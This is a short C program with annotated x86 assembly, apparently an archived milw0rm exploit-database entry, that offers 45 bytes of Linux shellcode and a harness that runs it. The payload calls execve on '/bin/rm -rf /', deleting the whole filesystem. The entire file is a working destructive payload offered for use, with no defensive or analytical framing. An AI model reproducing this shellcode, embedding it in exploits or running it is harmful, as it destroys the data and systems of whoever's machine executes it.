/* By Kris Katterjohn 11/18/2006
 *
 * 45 byte shellcode to execve("rm -rf /") for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; execve("/bin/rm", { "/bin/rm", "-r", "-f", "/", NULL }, NULL)
 *
 *      push byte 11
 *      pop eax
 *      cdq
 *      push edx
 *      push byte 0x2f
 *      mov edi, esp
 *      push edx
 *      push word 0x662d
 *      mov esi, esp
 *      push edx
 *      push word 0x722d
 *      mov ecx, esp
 *      push edx
 *      push 0x6d722f2f
 *      push 0x6e69622f
 *      mov ebx, esp
 *      push edx
 *      push edi
 *      push esi
 *      push ecx
 *      push ebx
 *      mov ecx, esp
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x6a\x0b\x58\x99\x52\x6a\x2f\x89\xe7\x52\x66\x68\x2d\x66\x89"
               "\xe6\x52\x66\x68\x2d\x72\x89\xe1\x52\x68\x2f\x2f\x72\x6d\x68"
               "\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x51\x53\x89\xe1\xcd\x80";

       (*(void (*)()) shellcode)();
}

// milw0rm.com [2006-11-17]